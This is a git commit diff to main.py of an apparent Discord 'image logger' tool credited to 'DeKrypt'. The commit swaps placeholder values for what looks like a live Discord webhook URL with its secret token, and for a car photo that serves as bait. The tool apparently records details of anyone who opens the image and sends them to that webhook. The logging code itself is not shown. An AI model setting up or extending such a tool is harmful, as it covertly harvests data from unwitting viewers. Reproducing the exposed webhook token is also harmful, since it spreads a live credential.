5b3714cc3e92380d62f3cc0402ada3a7e72ba957
Linarabe <166408793+Linarabe@users.noreply.github.com>
2024-04-08 17:09:35 +0200

    Update main.py

--- main.py
+++ main.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1226907749049438279/NrTQiaESZZBuOwQVBLB00rqEwFdO-zk6ooioasxX_KlGyulLkjzvw9PTcTsF3HG3HYe4",
+    "image": "https://feassets.bymycar.fr/vo/12/241296/0/audi-rs3-sportback-25-tfsi-400-s-tronic-7-quattro-occasion-2021-avignon.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
